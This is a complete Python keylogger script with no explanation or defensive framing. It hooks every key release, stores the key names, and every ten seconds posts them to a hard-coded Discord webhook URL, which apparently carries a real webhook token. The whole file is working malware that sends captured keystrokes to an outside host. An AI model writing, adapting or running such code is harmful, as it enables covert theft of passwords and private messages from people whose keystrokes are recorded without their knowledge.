import keyboard
import time
import requests
import threading

WEBHOOK_URL = 'https://discord.com/api/webhooks/1241499053187924038/vnRm-HMBr-oku4vh0-kFLl6IZxm_8aqJTd-K7pp8S-wUf7d2P5O6rELCl6_uGBt5Q2zl'

keylogs = []

def send_keylogs():
    global keylogs

    if keylogs:
       
        keylogs_str = '\n'.join(keylogs)

        payload = {
            'content': keylogs_str
        }

        requests.post(WEBHOOK_URL, data=payload)

        keylogs = []

    threading.Timer(10, send_keylogs).start()

def capture_keystrokes(event):
    global keylogs

    keylogs.append(event.name)

keyboard.on_release(callback=capture_keystrokes)

send_keylogs()

while True:
    time.sleep(1)